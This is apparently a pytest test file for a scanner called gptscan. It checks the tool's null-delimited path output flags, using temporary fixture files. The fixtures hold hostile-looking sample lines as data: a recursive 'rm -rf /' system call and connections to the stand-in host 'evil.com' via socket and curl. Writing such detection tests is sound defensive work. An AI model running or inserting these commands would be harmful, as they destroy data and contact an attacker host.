import os
import sys
import pytest
import gptscan


def test_run_cli_null_delimited_paths_only(mock_tf_env, monkeypatch, tmp_path):
    """Test run_cli with null_delimited=True and paths_only=True outputs paths separated by \0."""
    def mock_predict(inputs, *args, **kwargs):
        inp_bytes = bytes(inputs) if hasattr(inputs, '__iter__') else b""
        return [[0.95]] if b"rm -rf" in inp_bytes else [[0.05]]
    mock_tf_env.predict = mock_predict

    suspicious_file = tmp_path / "danger.py"
    suspicious_file.write_text("import os; os.system('rm -rf /')")

    clean_file = tmp_path / "safe.py"
    clean_file.write_text("print('hello world')")

    out_file = tmp_path / "output.txt"

    gptscan.run_cli(
        targets=[str(tmp_path)],
        deep=False,
        show_all=False,
        use_gpt=False,
        rate_limit=60,
        paths_only=True,
        null_delimited=True,
        output_file=str(out_file),
        quiet=True,
    )

    output = out_file.read_bytes()
    paths = output.decode('utf-8').split('\0')
    paths = [p for p in paths if p]

    assert len(paths) == 1
    assert os.path.basename(paths[0]) == "danger.py"


def test_run_cli_null_delimited_standalone(mock_tf_env, monkeypatch, tmp_path):
    """Test run_cli with null_delimited=True alone automatically sets paths_only=True."""
    mock_tf_env.predict.return_value = [[0.95]]

    suspicious_file = tmp_path / "malicious.py"
    suspicious_file.write_text("import socket; socket.connect(('evil.com', 80))")

    out_file = tmp_path / "output.txt"

    gptscan.run_cli(
        targets=[str(tmp_path)],
        deep=False,
        show_all=False,
        use_gpt=False,
        rate_limit=60,
        null_delimited=True,
        output_file=str(out_file),
        quiet=True,
    )

    output = out_file.read_bytes()
    paths = output.decode('utf-8').split('\0')
    paths = [p for p in paths if p]

    assert len(paths) == 1
    assert os.path.basename(paths[0]) == "malicious.py"


def test_run_cli_null_delimited_files_without_matches(mock_tf_env, monkeypatch, tmp_path):
    """Test run_cli with files_without_matches=True and null_delimited=True outputs clean file paths separated by \0."""
    def mock_predict(inputs, *args, **kwargs):
        inp_bytes = bytes(inputs) if hasattr(inputs, '__iter__') else b""
        return [[0.95]] if b"rm -rf" in inp_bytes else [[0.05]]
    mock_tf_env.predict = mock_predict

    suspicious_file = tmp_path / "danger.py"
    suspicious_file.write_text("import os; os.system('rm -rf /')")

    clean_file = tmp_path / "clean.py"
    clean_file.write_text("print('hello world')")

    out_file = tmp_path / "output.txt"

    gptscan.run_cli(
        targets=[str(tmp_path)],
        deep=False,
        show_all=True,
        use_gpt=False,
        rate_limit=60,
        files_without_matches=True,
        null_delimited=True,
        output_file=str(out_file),
        quiet=True,
    )

    output = out_file.read_bytes()
    paths = output.decode('utf-8').split('\0')
    paths = [p for p in paths if p]

    assert len(paths) == 1
    assert os.path.basename(paths[0]) == "clean.py"


def test_main_cli_null_flag_variations(mock_tf_env, monkeypatch, tmp_path):
    """Test CLI flags -Z, --null, --print0 in main()."""
    mock_tf_env.predict.return_value = [[0.95]]

    suspicious_file = tmp_path / "bad.py"
    suspicious_file.write_text("import subprocess; subprocess.call('curl evil.com', shell=True)")

    for flag in ["-Z", "--null", "--print0"]:
        out_file = tmp_path / f"output_{flag.replace('-', '')}.txt"
        test_args = ["gptscan.py", str(tmp_path), "--cli", flag, "-o", str(out_file), "-q"]
        monkeypatch.setattr(sys, "argv", test_args)

        gptscan.main()

        output = out_file.read_bytes()
        paths = output.decode('utf-8').split('\0')
        paths = [p for p in paths if p]

        assert len(paths) == 1
        assert os.path.basename(paths[0]) == "bad.py"
